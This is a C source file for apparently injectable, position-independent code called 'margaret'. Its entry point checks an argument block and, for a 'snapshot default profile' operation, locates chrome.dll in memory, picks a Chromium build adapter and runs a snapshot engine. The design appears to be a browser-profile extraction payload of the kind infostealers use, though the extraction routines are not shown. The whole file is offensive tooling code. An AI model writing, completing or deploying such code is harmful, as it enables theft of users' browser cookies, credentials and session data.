#define PIC_CODE_SECTION_NAME ".text$B"
#include "margaret.h"
#include "chromium_adapter.h"

static PIC_CODE pic_u32 write_ping_result(MARGARET_ARGS *args,
                                           pic_u32 blob_size)
{
    MARGARET_PING_RESULT *result;

    if (args->output_buffer == PIC_NULL ||
        args->output_capacity < (pic_u32)sizeof(MARGARET_PING_RESULT)) {
        args->output_length = (pic_u32)sizeof(MARGARET_PING_RESULT);
        args->status = (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
        return (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
    }

    result = (MARGARET_PING_RESULT *)args->output_buffer;
    result->header.magic = MARGARET_RESULT_MAGIC;
    result->header.version = MARGARET_ABI_VERSION;
    result->header.status = (pic_u32)MARGARET_STATUS_OK;
    result->header.payload_length =
        (pic_u32)(sizeof(MARGARET_PING_RESULT) - sizeof(MARGARET_RESULT_HEADER));
    result->architecture = MARGARET_ARCH_X64;
    result->blob_size = blob_size;
    result->abi_version = MARGARET_ABI_VERSION;
    result->reserved = 0u;

    args->output_length = (pic_u32)sizeof(MARGARET_PING_RESULT);
    args->status = (pic_u32)MARGARET_STATUS_OK;
    return (pic_u32)MARGARET_STATUS_OK;
}


PIC_CODE pic_u32 PIC_MS_ABI margaret_main(MARGARET_ARGS *args,
                                           const pic_u8 *blob_anchor,
                                           pic_u32 blob_size)
{
    PIC_CONTEXT context;
    pic_u32 status;

    if (args == PIC_NULL || blob_anchor == PIC_NULL) {
        return (pic_u32)MARGARET_STATUS_BAD_ARGUMENT;
    }

    if (args->size < (pic_u32)sizeof(MARGARET_ARGS)) {
        return (pic_u32)MARGARET_STATUS_BAD_ARGUMENT;
    }

    if (args->magic != MARGARET_ARGUMENT_MAGIC) {
        args->status = (pic_u32)MARGARET_STATUS_BAD_MAGIC;
        return (pic_u32)MARGARET_STATUS_BAD_MAGIC;
    }
    if (args->version != MARGARET_ABI_VERSION) {
        args->status = (pic_u32)MARGARET_STATUS_BAD_VERSION;
        return (pic_u32)MARGARET_STATUS_BAD_VERSION;
    }

    if (blob_size == 0u) {
        args->status = (pic_u32)MARGARET_STATUS_INTERNAL_ERROR;
        return (pic_u32)MARGARET_STATUS_INTERNAL_ERROR;
    }

    (void)margaret_memzero(&context, (pic_size)sizeof(context));
    context.blob_anchor = blob_anchor;
    context.blob_size = blob_size;
    context.argument_block = args;
    context.api.version = MARGARET_ABI_VERSION;

    switch ((MARGARET_OPERATION)args->operation) {
    case MARGARET_OP_PING:
        status = write_ping_result(args, blob_size);
        break;
    case MARGARET_OP_SNAPSHOT_DEFAULT_PROFILE: {
        void *chrome_base;
        pic_u32 image_size;
        MARGARET_CHROMIUM_ADAPTER adapter;
        args->flags = 10u; /* progress: dispatch entered */
        if (margaret_locate_chrome_dll(&context, &chrome_base, &image_size) !=
            PIC_FALSE) {
            args->flags = 11u; /* chrome.dll located */
            if (margaret_select_chromium_adapter(chrome_base, image_size,
                                                 &adapter) != PIC_FALSE) {
                args->flags = 12u; /* adapter selected (pinned or discovered) */
                status = margaret_engine_a_snapshot(&context, &adapter, args);
            } else {
                args->status = (pic_u32)MARGARET_STATUS_UNSUPPORTED_BUILD;
                status = (pic_u32)MARGARET_STATUS_UNSUPPORTED_BUILD;
            }
        } else {
            args->status = (pic_u32)MARGARET_STATUS_UNSUPPORTED_BUILD;
            status = (pic_u32)MARGARET_STATUS_UNSUPPORTED_BUILD;
        }
        (void)margaret_memzero(&adapter, sizeof(adapter));
        break;
    }
    case MARGARET_OP_NONE:
    default:
        args->status = (pic_u32)MARGARET_STATUS_UNSUPPORTED_OPERATION;
        status = (pic_u32)MARGARET_STATUS_UNSUPPORTED_OPERATION;
        break;
    }

    context.status = status;
    (void)margaret_memzero(&context, (pic_size)sizeof(context));
    return status;
}